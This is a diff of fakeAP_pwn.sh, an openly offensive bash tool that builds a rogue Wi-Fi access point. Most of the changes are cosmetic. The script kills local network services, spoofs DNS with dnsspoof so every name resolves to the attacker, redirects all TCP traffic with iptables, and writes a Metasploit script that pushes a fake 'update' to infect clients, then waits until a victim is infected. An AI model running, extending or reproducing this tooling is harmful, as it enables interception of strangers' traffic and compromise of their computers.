@@ -1,6 +1,6 @@
 #!/bin/bash                                                                                    #
 # (C)opyright 2010 - g0tmi1k & joker5bb                                                        #
-# fakeAP_pwn.sh v0.3 (Beta-#77 2010-07-31)                                                     #
+# fakeAP_pwn.sh v0.3 (Beta-#78 2010-07-31)                                                     #
 #---Important----------------------------------------------------------------------------------#
 # Make sure to copy "www": cp -rf www/* /var/www/fakeAP_pwn                                    #
 # The VNC password is "g0tmi1k" (without "")                                                   #
@@ -25,7 +25,6 @@
 # Beep on connected client                                                                     #
 # Check for other monitor inferfaces?                                                          #
 # Check for update at start?                                                                   #
-# $error="blah", do, save to log, cleanup                                                      #
 #---Defaults-----------------------------------------------------------------------------------#
 # The interfaces you use (Check with ifconfig!)
 interface=eth0
@@ -71,7 +70,7 @@ verbose=0
 gatewayIP=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
     ourIP="127.0.0.1" # 10.0.0.1?
      port=$(shuf -i 2000-65000 -n 1)
-  version="0.3 (Beta-#77)"
+  version="0.3 (Beta-#78)"
       www="${www%/}"
 trap 'cleanup interrupt' 2 # Interrupt - "Ctrl + C"
 
@@ -113,15 +112,12 @@ function cleanup() {
    fi
    if [ "$apMode" == "non" ] ; then # Else will will remove their internet access!
       if [ $(echo route | grep "10.0.0.0") ] ; then route del -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1; fi
-      iptables --flush        # remove existing rules
+      iptables --flush        # Remove existing rules - Start fresh
       iptables --delete-chain
       iptables --zero
       echo 0 > /proc/sys/net/ipv4/ip_forward
    fi
    # ubuntu fixes
-   #command="service network-manager start"
-   #if [ "$verbose" == "2" ] ; then echo "Command: $command" ; fi; if [ "$diagnostics" == "true" ] ; then echo "$command" >> fakeAP_pwn.log; fi
-   #$xterm -geometry 75x8+100+0 -T "fakeAP_pwn v$version - Starting 'network-manager'" -e "$command" # Start network-manager
    if [ -e /etc/apparmor.d/usr.sbin.dhcpd3.bkup ]; then mv -f /etc/apparmor.d/usr.sbin.dhcpd3.bkup /etc/apparmor.d/usr.sbin.dhcpd3; fi # Fixes folder persmissions
 
    echo -e "\e[01;36m[>]\e[00m Done! (= Have you... g0tmi1k?"
@@ -183,9 +179,6 @@ function help() {
    exit 1
 }
 function update() {
-   #svn checkout http://fakeap-pwn.googlecode.com/svn/
-   #svn update
-   #wget http://fakeap-pwn.googlecode.com/ fakeAP_pwn.tar.gz
    if [ -e /usr/bin/svn ] ; then
       display action "Checking for update..." $diagnostics
       update=$(svn info http://fakeap-pwn.googlecode.com/svn/ | grep "Revision:" |cut -c11-)
@@ -205,8 +198,8 @@ function update() {
    exit 2
 }
 
-function testAP() {
-   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then return 1; fi # Coding error ($1 = ESSID, $2 = $wiFiinterface)
+function testAP() { # testAP essid wiFiinterface
+   if [ "$1" == "" ] ||  [ "$2" == "" ] ; then return 1; fi # Coding error
    eval list=( $(iwlist $2 scan 2>/dev/null | awk -F":" '/ESSID/{print $2}') )
    if [ -z "${list[0]}" ]; then
       return 2 # Couldn't detect a single AP
@@ -217,10 +210,7 @@ function testAP() {
    return 3 # Couldn't find the fake AP
 }
 
-function action() {
-   # action title command verbose diagnostics screen&file debug x y lines
-   # action "Resetting interface" "$command" $verbose $diagnostics "true" $debug
-   # action "Resetting interface" "$command" $verbose $diagnostics "true" $debug 10 5 22
+function action() { # action title command verbose diagnostics screen&file debug x y lines
    error="free"
    if [ "$1" == "" ] ||  [ "$2" == "" ] ||  [ "$3" == "" ] ||  [ "$4" == "" ] || [ "$5" == "" ] || [ "$6" == "" ] ; then error="1" ; fi # Coding error
    if [ "$3" != "0" ] && [ "$3" != "1" ] && [ "$3" != "2" ]; then error="3"; fi # Coding error
@@ -253,10 +243,7 @@ function action() {
    fi
 }
 
-function display(){
-   # display type message save2file
-   # display action "Cleaning up..."
-   # display action "Cleaning up..." $diagnostics
+function display(){ # display type message save2file
    error="free"
    if [ "$1" == "" ] ||  [ "$2" == "" ] ; then error="1" ; fi # Coding error
    if [ "$1" != "action" ] && [ "$1" != "info" ] && [ "$1" != "diag" ] && [ "$1" != "error" ] ; then error="5"; fi # Coding error
@@ -310,7 +297,7 @@ while getopts "i:w:m:e:c:y:o:p:b:h:t:rz:a:xdDvVu?" OPTIONS; do
     V     ) export verbose="2";;
     u     ) update;;
     ?     ) help;;
-    *     ) display error "Unknown option." $diagnostics;;   # DEFAULT
+    *     ) display error "Unknown option." $diagnostics;;   # Default
   esac
 done
 
@@ -337,7 +324,7 @@ fi
 if [ "$wifiInterface" == "" ] ; then display error "wifiInterface can't be blank" $diagnostics 1>&2; cleanup; fi
 command=$(iwconfig $wifiInterface 2>/dev/null | grep "802.11" | cut -d" " -f1)
 if [ ! $command ]; then
-   display info "$wifiInterface isn't a wireless interface." $diagnostics
+   display error "$wifiInterface isn't a wireless interface." $diagnostics
    display info "Searching for a wireless interface" $diagnostics
    command=$(iwconfig 2>/dev/null | grep "802.11" | cut -d" " -f1) #| awk '!/"'"$interface"'"/'
    if [ $command ] ; then
@@ -493,19 +480,16 @@ elif [ "$apType" == "hostapd" ] ; then
       read -p "[*] Would you like to try and install it? [Y/N]: " -n 1
       if [[ $REPLY =~ ^[Yy]$ ]] ; then
          action "Install hostapd" "apt-get -y install hostapd" $verbose $diagnostics "true" $debug
-#wget http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz
-#tar zxvf libnl-1.1.tar.gz && rm libnl-1.1.tar.gz
-#libnl-1.1/
-#./configure
-
-#http://acx100.erley.org/acx/nl80211_master_mode.html
-
-#git clone git://w1.fi/srv/git/hostap.git
-#cd hostap
-#cd hostapd
-#cp defconfig .config
-#nano .config  and uncomment the line #CONFIG_DRIVER_NL80211=y
-#make && make install
+         #action "Install hostapd" "wget -P /tmp http://people.suug.ch/~tgr/libnl/files/libnl-1.1.tar.gz && tar -C /tmp -xvf /tmp/libnl-1.1.tar.gz && rm /tmp/libnl-1.1.tar.gz" $verbose $diagnostics "true" $debug
+         #action "Install hostapd" "command=$(pwd) && cd /tmp/libnl-1.1 && ./configure && cd $command" $verbose $diagnostics "true" $debug
+         #action "Install hostapd" "make -C /tmp/libnl-1.1" $verbose $diagnostics "true" $debug
+         #action "Install hostapd" "make install -C /tmp/libnl-1.1" $verbose $diagnostics "true" $debug
+         #action "Install hostapd" "wget -P /tmp http://hostap.epitest.fi/releases/hostapd-0.7.2.tar.gz && tar -C /tmp -xvf /tmp/hostapd-0.7.2.tar.gz && rm /tmp/hostapd-0.7.2.tar.gz" $verbose $diagnostics "true" $debug
+         #find="#CONFIG_DRIVER_NL80211=y"
+         #replace="CONFIG_DRIVER_NL80211=y"
+         #sed "s/$replace/$find/g" /tmp/hostapd-0.7.2/hostapd/defconfig > /tmp/hostapd-0.7.2/hostapd/.config
+         #action "Install hostapd" "make -C /tmp/hostapd-0.7.2/hostapd/" $verbose $diagnostics "true" $debug
+         #action "Install hostapd" "make install -C /tmp/hostapd-0.7.2/hostapd/" $verbose $diagnostics "true" $debug
       fi
    if [ ! -e /usr/sbin/hostapd ] && [ ! -e /usr/local/bin/hostapd ] ; then
       display error "Failed to install hostapd." $diagnostics 1>&2
@@ -625,14 +609,14 @@ fi
 
 if [ "$apMode" != "non" ] ; then
    action "Resetting interface" "ifconfig $interface up && sleep 1" $verbose $diagnostics "true" $debug #command="ifconfig $interface down && sleep 1 && ifconfig $interface up && sleep 1" fails if you dont have DHCP
-#if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
+   command=$(ifconfig | grep -q -o "$interface")
+   if [ ! $command == "" ] ; then display error "$interface is down" $diagnostics 1>&2; cleanup; fi # check to make sure $interface came up!
    command=$(ifconfig | grep $interface | awk '{print $1}')
    if [ "$command" != "$interface" ] ; then
       display error "The gateway interface $interface, isn't correct." $diagnostics 1>&2
       if [ "$debug" == "true" ] ; then ifconfig; fi
       display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
       apMode="non"
-      #cleanup
    fi
    if [ -z "$ourIP" ] && [ "$apMode" != "non" ] ; then # not sure if this 100% correct
       action "Acquiring an IP Address" "dhclient $interface" $verbose $diagnostics "true" $debug
@@ -642,18 +626,12 @@ if [ "$apMode" != "non" ] ; then
          display error "IP Problem. Haven't got an IP address on $interface." $diagnostics 1>&2
          display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
          apMode="non"
-         #command=$(ps aux | grep $interface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
-         #if [ -n "$command" ] ; then
-         #   kill $command # Kill dhclient on the internet interface after it fails to get ip, to prevent errors in restarting the script
-         #fi
-         #cleanup
       else
          ourIP=$command
       fi
       command=$(route -n | awk '/^0.0.0.0/ {getline; print $2}')
       if [ "$command" == "" ] ; then
          display error "Gateway IP Problem. Can't detect the gateway on $interface." $diagnostics 1>&2
-         #cleanup
          display info "Switching apMode to: non (No Internet access after infection)" $diagnostics
          apMode="non"
          gatewayIP=10.0.0.1 # For DHCP
@@ -679,7 +657,6 @@ action "Killing 'Programs'" "killall dhcpd3 apache2 wicd-client airbase-ng hosta
 action "Killing 'DHCP3 Service'" "/etc/init.d/dhcp3-server stop" $verbose $diagnostics "true" $debug
 action "Killing 'Apache2 Service'" "/etc/init.d/apache2 stop" $verbose $diagnostics "true" $debug
 action "Killing 'wicd Service'" "/etc/init.d/wicd stop" $verbose $diagnostics "true" $debug # Stopping wicd to prevent channel hopping
-#action "Killing 'network-manager'" "service network-manager stop" $verbose $diagnostics "true" $debug # Stop network-manager (Ubuntu)
 
 #----------------------------------------------------------------------------------------------#
 display action "Setting up wireless card..." $diagnostics
@@ -693,7 +670,8 @@ fi
 action "Bringing down $wifiInterface" "ifconfig $wifiInterface down" $verbose $diagnostics "true" $debug
 sleep 1
 action "Bringing up $wifiInterface" "ifconfig $wifiInterface up" $verbose $diagnostics "true" $debug
-#if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
+command=$(ifconfig | grep -q -o  "$wifiInterface")
+if [ ! $command == "" ] ; then display error "$wifiInterface is down" $diagnostics 1>&2; cleanup; fi # check to make sure $interface came up!
 command=$(ps aux | grep $wifiInterface | awk '!/grep/ && !/awk/ && !/fakeAP_pwn/ {print $2}' | while read line; do echo -n "$line "; done | awk '{print}')
 if [ -n "$command" ] ; then
    action "Killing programs which are using $wifiInterface" "kill $command" $verbose $diagnostics "true" $debug # to prevent interference
@@ -722,7 +700,6 @@ if [ "$apType" == "airbase-ng" ] ; then
       if [ $(echo '$command' | grep "Found 0 APs") ] ; then display error "Couldn't test packet injection" $diagnostics 1>&2;
       elif [ ! $(echo '$command' | grep "Injection is working") ] ; then
          display error "$monitorInterface doesn't support packet injecting." $diagnostics 1>&2
-         #cleanup
       fi
    fi
 fi
@@ -746,8 +723,7 @@ fi
 
 #----------------------------------------------------------------------------------------------#
 display action "Creating: Scripts" $diagnostics
-# metasploit script
-if [ -e /tmp/fakeAP_pwn.rb ] ; then rm /tmp/fakeAP_pwn.rb; fi
+if [ -e /tmp/fakeAP_pwn.rb ] ; then rm /tmp/fakeAP_pwn.rb; fi # metasploit script
 echo "# ID: fakeAP_pwn.rb v$version
 # Author: g0tmi1k at http://g0tmi1k.blogspot.com
 
@@ -1013,8 +989,7 @@ print_line(\"[*] Done!\")" >> /tmp/fakeAP_pwn.rb
 if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.rb"; fi
 if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.rb ; fi
 
-# dhcp script
-if [ -e /tmp/fakeAP_pwn.dhcp ] ; then rm /tmp/fakeAP_pwn.dhcp; fi
+if [ -e /tmp/fakeAP_pwn.dhcp ] ; then rm /tmp/fakeAP_pwn.dhcp; fi # DHCP script
 echo "# fakeAP_pwn.dhcp v$version
 ddns-update-style interim;
 ignore client-updates; # Ignore all client requests for DDNS update
@@ -1039,8 +1014,7 @@ echo "  option netbios-name-servers 10.0.0.100;
 if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dhcp"; fi
 if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dhcp; fi
 
-# apache - virtual host
-if [ -e /etc/apache2/sites-available/fakeAP_pwn ] ; then rm /etc/apache2/sites-available/fakeAP_pwn; fi
+if [ -e /etc/apache2/sites-available/fakeAP_pwn ] ; then rm /etc/apache2/sites-available/fakeAP_pwn; fi # Apache (Virtual host)
 echo "# fakeAP_pwn v$version
 	<VirtualHost *:80>
 	ServerAdmin webmaster@localhost
@@ -1113,23 +1087,15 @@ echo "# fakeAP_pwn v$version
 if [ "$verbose" == "2" ]  ; then echo "Created: /etc/apache2/sites-available/fakeAP_pwn"; fi
 if [ "$debug" == "true" ] ; then cat /etc/apache2/sites-available/fakeAP_pwn; fi
 
-# DNS script
-if [ "$apMode" != "normal" ] ; then
+if [ "$apMode" != "normal" ] ; then # DNS script
    if [ -e /tmp/fakeAP_pwn.dns ] ; then rm /tmp/fakeAP_pwn.dns; fi
    echo "# fakeAP_pwn.dns v$version
 10.0.0.1 *" > /tmp/fakeAP_pwn.dns # dnsspoof
-#use auxiliary/server/fakedns     # metasploit
-#set INTERFACE $apInterface
-#set DOMAINBYPASS *
-#set SRVHOST 0.0.0.0
-#set SRVPORT 53
-#set TARGETHOST 10.0.0.1
-#run" > /tmp/fakeAP_pwn.dns
    if [ "$verbose" == "2" ]  ; then echo "Created: /tmp/fakeAP_pwn.dns"; fi
    if [ "$debug" == "true" ] ; then cat /tmp/fakeAP_pwn.dns; fi
 fi
 
-# hostapd config
+# Hostapd config
 if [ "$apType" == "hostapd" ] ; then
    if [ -e /tmp/fakeAP_pwn.hostapd ] ; then rm /tmp/fakeAP_pwn.hostapd; fi
    echo "# fakeAP_pwn.hostapd v$version
@@ -1209,8 +1175,6 @@ if [ "$apType" == "airbase-ng" ] ; then
    for i in {1..3} ; do # Main Loop
       killall airbase-ng 2>/dev/null # Start fresh...
       sleep 1
-#command="airbase-ng -P -C 60 -c $fakeAPchannel -e \"$ESSID\" $monitorInterface -v"
-#command="airbase-ng $monitorInterface -a $macAddress -W 0 -y -c $fakeAPchannel -e \"$ESSID\" -P -C 60 -v"
       command="airbase-ng -a $macAddress -W 0 -c $fakeAPchannel -e \"$ESSID\"" # taken out y
       #command="airbase-ng -a $macAddress -c $fakeAPchannel -e \"$ESSID\""     # taken out y & W
       #command="airbase-ng -W 0 -c $fakeAPchannel -e \"$ESSID\""               # taken out y & a
@@ -1220,7 +1184,6 @@ if [ "$apType" == "airbase-ng" ] ; then
       action "Fake Access Point" "$command $monitorInterface" $verbose $diagnostics "true" $debug 10 0 4& # Dont wait, do the next command
       sleep 3
       ifconfig at0 up                                       # The new FakeAP interface
-#if [ ! $(ifconfig | grep -o -q "$interface") == "" ] ; then echo "Stil down" cleanup; fi # check to make sure $interface came up!
       command=$(ifconfig -a | grep at0 | awk '{print $1}')
       if [ "$command" != "at0" ] ; then
          display error "Couldn't create the access point's interface." $diagnostics 1>&2
@@ -1248,7 +1211,6 @@ if [ "$apType" == "airbase-ng" ] ; then
             break; # Main Loop
          fi
       fi
-# Ping test? Make sure its working working...
       if [ -z "$(pgrep airbase-ng)" ] ; then
          display error "airbase-ng failed to start." $diagnostics 1>&2
          if [ "$verbose" == "2" ] ; then echo "Command: killall xterm"; fi;
@@ -1270,7 +1232,6 @@ elif [ "$apType" == "hostapd" ] ; then
    fi
 fi
 
-
 if [ "$diagnostics" == "true" ] ; then
    sleep 5
    display diag "ping -I $apInterface -c 4 10.0.0.1" $diagnostics
@@ -1284,7 +1245,7 @@ ifconfig lo up
 ifconfig $apInterface 10.0.0.1 netmask 255.255.255.0
 ifconfig $apInterface mtu $mtu
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
-iptables --flush       # remove existing rules
+iptables --flush       # Remove existing rules - Start fresh
 iptables --delete-chain
 iptables --zero
 echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -1297,15 +1258,9 @@ if [ "$apMode" == "normal" ] ; then
    iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
    iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
    iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to-destination $gatewayIP
-      #iptables --table nat --append POSTROUTING -s 10.0.0.0/24 --out-interface $interface --jump MASQUERADE
-      #iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
-      #iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT
-      #iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
-      #iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP
-      #iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 -i $interface -d $gatewayIP -p all -j DROP  #protect the gateway
 elif [ "$apMode" == "transparent" ] || [ "$apMode" == "non" ] ; then
    iptables --table nat --append PREROUTING --in-interface $apInterface --jump REDIRECT
-   #iptables --table nat --append PREROUTING --proto tcp --jump DNAT --to-destination 64.111.96.38          # Blackhole Routing - Send everything to that IP address
+   iptables --table nat --append PREROUTING --proto tcp --jump DNAT --to-destination 10.0.0.1          # Blackhole Routing - Send everything to that IP address
 fi
 
 # DHCP
@@ -1321,7 +1276,6 @@ if [ -e /etc/apparmor.d/usr.sbin.dhcpd3 ] ; then # ubuntu - Fixes folder persmis
 	mv /etc/apparmor.d/usr.sbin.dhcpd3 /etc/apparmor.d/usr.sbin.dhcpd3.bkup
    mv /etc/apparmor.d/usr.sbin.dhcpd3.fakeAP_pwn /etc/apparmor.d/usr.sbin.dhcpd3
 fi
-# ubuntu - PID need
 
 #----------------------------------------------------------------------------------------------#
 display action "Starting: DHCP" $diagnostics
@@ -1336,7 +1290,6 @@ fi
 #----------------------------------------------------------------------------------------------#
 if [ "$apMode" != "normal" ] ; then
    display action "Starting: DNS" $diagnostics
-   #command=$(/opt/metasploit3/bin/msfconsole -r /tmp/fakeAP_pwn.dns) #metasploit
    action "DNS" "dnsspoof -i at0 -f /tmp/fakeAP_pwn.dns" $verbose $diagnostics "true" $debug 10 165 5 & # Dont wait, do the next command
    sleep 2
 
@@ -1399,25 +1352,10 @@ fi
    fi
 
 #----------------------------------------------------------------------------------------------#
-#   display action "Forcing target to vist the fake update site..." $diagnostics
-#   if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1"; fi
-#   if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1"; fi
-#   iptables -A INPUT -p udp -i $apInterface --dport 53 -j ACCEPT
-#   iptables -A INPUT -p tcp -i $apInterface --dport 80 -j ACCEPT
-#   iptables -A INPUT -p tcp -i $apInterface --dport 443 -j ACCEPT
-#   iptables -A INPUT -p tcp -i $apInterface --dport $port -j ACCEPT
-#   iptables -A INPUT -p udp -i $apInterface --dport $port -j ACCEPT
-#   iptables -A INPUT -i $apInterface -j DROP # drop all other traffic
-#   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
-#   iptables -t nat -A PREROUTING -i $apInterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
-#   sleep 1
-
-#----------------------------------------------------------------------------------------------#
-   # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
    if [ "$debug" == "true" ] || [ "$verbose" == "2" ] || [ "$diagnostics" == "true" ] ; then
       action "Connections" "watch -d -n 1 \"arp -n -v -i $apInterface\"" $verbose $diagnostics "true" $debug 10 475 5 & # Dont wait, do the next command
    fi
-   display info "Waiting for target to run the \"update\"" $diagnostics
+   display info "Waiting for target to run the \"update\"" $diagnostics # Wait till target is infected (It's checking for a file to be created by the metasploit script (fakeAP_pwn.rb))
    if [ -e /tmp/fakeAP_pwn.lock ] ; then rm -r /tmp/fakeAP_pwn.lock; fi
    while [ ! -e /tmp/fakeAP_pwn.lock ] ; do
       sleep 5
@@ -1432,7 +1370,7 @@ fi
 #----------------------------------------------------------------------------------------------#
    if [ "$apMode" == "transparent" ] ; then
       display action "Giving internet access..." $diagnostics
-      iptables --flush       # remove existing rules
+      iptables --flush       # Remove existing rules - Start fresh
       iptables --delete-chain
       iptables --zero
       echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -1444,7 +1382,7 @@ fi
       iptables --table nat --append POSTROUTING --out-interface $interface --jump MASQUERADE
       iptables --append FORWARD --in-interface $apInterface --jump ACCEPT
       iptables --table nat --append PREROUTING --proto all --jump DNAT --to-destination $gatewayIP
-      iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 -i $apInterface -d $gatewayIP -p all -j DROP  #protect the gateway
+      iptables -A INPUT -m iprange --src-range 10.0.0.150-10.0.0.250 -i $apInterface -d $gatewayIP -p all -j DROP  # Protect the gateway
    fi
 
 #----------------------------------------------------------------------------------------------#
